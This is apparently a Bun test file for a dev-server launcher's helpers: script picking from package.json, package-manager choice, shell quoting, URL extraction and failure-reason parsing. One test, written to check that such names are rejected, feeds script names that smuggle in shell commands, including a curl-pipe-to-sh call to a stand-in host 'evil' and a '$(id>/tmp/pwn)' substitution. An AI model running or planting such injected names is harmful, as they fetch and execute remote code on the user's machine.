// The live test's guessing, tried outside the app: `bun test mods/pane-prompt/live.test.js`.
import { test, expect } from "bun:test";
import { readFileSync } from "node:fs";
import { planFromPackage, managerFrom, commandFor, scriptArgs, findUrls, reasonFrom, shellIdle } from "./live.js";

// The + menu has its own copy of this module: one edit, not two.
test("the menu's copy is this file", () => {
  const here = (path) => readFileSync(new URL(path, import.meta.url), "utf8");
  expect(here("../new-menu-pinned/live.js")).toBe(here("./live.js"));
});

test("a package.json's dev script, the manager from its lock file", () => {
  expect(planFromPackage('{"scripts":{"dev":"vite"}}')).toEqual({ script: "dev" });
  expect(planFromPackage('{"scripts":{"start:x":"node ."}}')).toEqual({ script: "start:x" });
  expect(planFromPackage('{"scripts":{"build":"tsc"}}').error).toContain("no dev/start script");
  expect(planFromPackage("nope").error).toContain("not valid JSON");
  expect(managerFrom({ bun: true, pnpm: true })).toBe("pnpm");
  expect(managerFrom({})).toBe("npm");
  expect(commandFor("bun", "dev")).toBe("bun run dev");
});

// A script's name is the repository's text, not ours. The picker must never hand a shell a
// name it would read as a second command: `npm run dev-;curl … | sh` runs the curl.
test("a script name that is also a shell command is not picked", () => {
  for (const name of ["dev-;curl -s https://evil/x|sh", "dev-$(id>/tmp/pwn)", "dev`id`", "dev&&id", "dev\nid"]) {
    const pkg = JSON.stringify({ scripts: { [name]: "vite" } });
    expect(planFromPackage(pkg).error).toContain("no dev/start script");
  }
  // What a name may still be: the separators real projects use.
  for (const name of ["dev:x", "start.worker", "preview-2", "dev:api"]) {
    expect(planFromPackage(JSON.stringify({ scripts: { [name]: "vite" } }))).toEqual({ script: name });
  }
});

// Two ways to run it: one line to type into a shell, and arguments that never pass through
// one. The name stays a single argv element in the second, whatever it holds.
test("a script runs as its own argument, never as part of a shell word", () => {
  expect(scriptArgs("npm", "dev:x")).toEqual(["bash", "-lc", 'exec "$@"', "sh", "npm", "run", "dev:x"]);
  expect(commandFor("npm", "dev")).toBe("npm run dev");
  expect(commandFor("npm", "dev;id")).toBe("npm run 'dev;id'");
  expect(commandFor("npm", "it's")).toBe("npm run 'it'\\''s'");
});

// A failed dev run: an API on 8788 printed first, and vite never got to print its
// page URL, because port 8787 was already taken.
const FAILED = [
  "$ bun scripts/dev.ts",
  "[api] Demo API listening on http://127.0.0.1:8788 (config: /home/dev/apps/demo-api)",
  "[web] error when starting dev server:",
  "[web] Error: Port 8787 is already in use",
  "[web]     at httpServerStart (file:///home/dev/apps/shop-web/node_modules/vite/dist/node/chunks/node.js:14673:10)",
  "[web]     at process.processTicksAndRejections (node:internal/process/task_queues:104:5)",
  'error: script "dev" exited with code 1',
  "sh-5.3$",
].join("\n");

test("every URL a server printed, in order, once each", () => {
  expect(findUrls("[api] listening on http://127.0.0.1:8788\n[web] Local: http://127.0.0.1:8787/"))
    .toEqual(["http://127.0.0.1:8788", "http://127.0.0.1:8787/"]);
  expect(findUrls("\u001b[36m[web]\u001b[0m  ➜  http://localhost:3000/\r\n and http://localhost:3000/ again"))
    .toEqual(["http://localhost:3000/"]);
  expect(findUrls("http://0.0.0.0:5173/.")).toEqual(["http://localhost:5173/"]);
  expect(findUrls("no urls here")).toEqual([]);
  expect(findUrls(FAILED)).toEqual(["http://127.0.0.1:8788"]);
});

test("a terminal back at its prompt is not going to print another URL", () => {
  expect(shellIdle(FAILED)).toBe(true);
  expect(shellIdle("$ bun run dev\n  ➜  Local: http://127.0.0.1:3000/")).toBe(false);
  expect(shellIdle("Server ready on http://127.0.0.1:3000/\n")).toBe(false);
  expect(shellIdle("")).toBe(false);
  expect(shellIdle("\u001b[32m➜\u001b[0m  ~/repo \u001b[36mgit:main\u001b[0m $ ")).toBe(true);
});

test("why a start failed: the lines that name it, not the stack or the prompt", () => {
  expect(reasonFrom(FAILED))
    .toBe('[web] Error: Port 8787 is already in use · error: script "dev" exited with code 1');
  // A log that names no problem is no reason: the caller says what did not answer instead.
  expect(reasonFrom("$ bun run dev\nServer ready on http://127.0.0.1:3000/\nsh-5.3$")).toBe("");
  expect(reasonFrom("")).toBe("");
});
